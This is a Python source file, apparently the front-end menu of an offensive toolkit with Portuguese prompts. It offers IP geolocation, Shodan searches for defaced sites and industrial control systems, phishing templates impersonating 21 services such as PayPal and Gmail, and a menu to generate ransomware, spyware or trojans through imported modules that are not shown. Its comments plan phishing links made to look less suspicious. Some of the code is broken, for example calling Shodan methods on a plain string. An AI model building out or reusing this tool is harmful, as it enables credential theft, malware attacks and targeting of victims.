#bibliotecas
from colorama import Fore, init, Back, Style
import shutil
import time
import requests
import random
import platform
import keyboard
import webbrowser
import os
from core import doxxing, goldenphish, ser, scanner
from malware import ransomware, spyware
from urllib.request import urlopen 
from cryptography.fernet import Fernet
import shutil
from shodan import Shodan

print(f"""{Fore.CYAN}
  _______  ______   ______   .______     ______   .______     .___________.
 /  _____||   ____| /  __  \  |   _  \   /  __  \  |   _  \    |           |
|  |  __  |  |__   |  |  |  | |  |_)  | |  |  |  | |  |_)  |   `---|  |----`
|  | |_ | |   __|  |  |  |  | |   ___/  |  |  |  | |      /        |  |     
|  |__| | |  |____ |  `--'  | |  |      |  `--'  | |  |\  \----.   |  |     
 \______| |_______| \______/  | _|       \______/  | _| `._____|   |__|     
                                                                            
  |--------------------------------------------------------------------------------------------|
  | [1] Geolocalizar IP.                                                                       |
  | [2] Phishing                                                                               |
  | [3] Criar Malware                                                                          |
  | [4] Obter informações de número                                                            |
  | [5] Rastrear Alvo                                                                          |
  | [0] Sair                                                                                   |
  |--------------------------------------------------------------------------------------------|
""")
resposta = int(input('O que você precisa hoje? '))

if resposta == 1:
    os.system("cls")
    print(f"""{Fore.BLACK} 
   _____            _                 _ _               
  / ____|          | |               | (_)              
 | |  __  ___  ___ | | ___   ___ __ _| |_ ______ _ _ __ 
 | | |_ |/ _ \/ _ \| |/ _ \ / __/ _` | | |_  / _` | '__|
 | |__| |  __/ (_) | | (_) | (_| (_| | | |/ / (_| | |   
  \_____|\___|\___/|_|\___/ \___\__,_|_|_/___\__,_|_|    
  |--------------------------------------------------------------------------------------------|
  | [1] Geolocalizar IP.                                                                       |
  | [2] Shodan                                                                                 |
  | [3] Whois                                                                                  |
  |--------------------------------------------------------------------------------------------|   
    """)
    resposta1 = int(input("O que você deseja fazer? "))
    if resposta1 == 1:
        try: 
            ip = input('Insira o endereço de ip: ')

            if ip: 
                url = f"http://ip-api.com/json/{ip}"

                request = urlopen(url)
                data = request.read().decode()

                data = eval(data)

                for i in data:
                    resposta = print(f"{i} == {data[i]}")
        except Exception as  ex:
            print(f"Error: (ex)")
    if resposta1 == 2:
            print("Para obter a chave shodan vá neste endereço https://account.shodan.io")
            api = str(input("Insira sua chave shodan: "))
            ipinfo = api.host('8.8.8.8')
            print(ipinfo)

            for banner in api.search_cursor('http.tittle:"hacked by"'):
                print(banner)
            ics_services = api.count('tag:ics')
            print(f'Industrial Control Systems: {ics_services}')

#selecionar qual será o site que vamos usar para atacar o alvo
#criar link de phishing
#arrumar links de phishing para evitar que fique muito na cara
#preparar link de phishing para todos poderem conectar 

if resposta == 2: 
    print("Templates")

    print("[1] Instagram          [2] Facebook            [3] Snapchat")
    print("[4] Twitter            [5] GitHub              [6] Gmail")
    print("[7] Spotify            [8] Netflix             [9] PayPal")
    print("[10] Microsoft         [11] Steam              [12] Yahoo")
    print("[13] LinkedIn          [14] Protonmail         [15] Wordpress")
    print("[16] Pinterest         [17] Twitch             [18] Discord")
    print("[19] Disney +          [20] Star +             [21] Hbo max")

    templates = {
        '1':'instagram',
        '2': 'facebook',
        '3': 'snapchat',
        '4': 'twitter',
        '5': 'github',
        '6': 'Gmail',
        '7': 'spotify',
        '8': 'netflix',
        '9': 'paypal',
        '10': 'Microsoft',
        '11': 'steam',
        '12': 'yahoo',
        '13': 'linkedin',
        '14': 'protonmail',
        '15': 'wordpress',
        '16': 'Pinterest',
        '17': 'Twitch',
        '18': 'Discord',
        '19': 'Disney +',
        '20': 'Star +',
        '21': 'Hbo max',
        }


if resposta == 3:
    print("1 - Ransomware")
    print("2 - Spyware")
    print("3 - Trojan")
    print("0 - Sair")

    resposta = int(input("Insira o número do vírus que você deseja criar: "))

    if resposta == 1:
        ransomware.gerarcodigo()

        

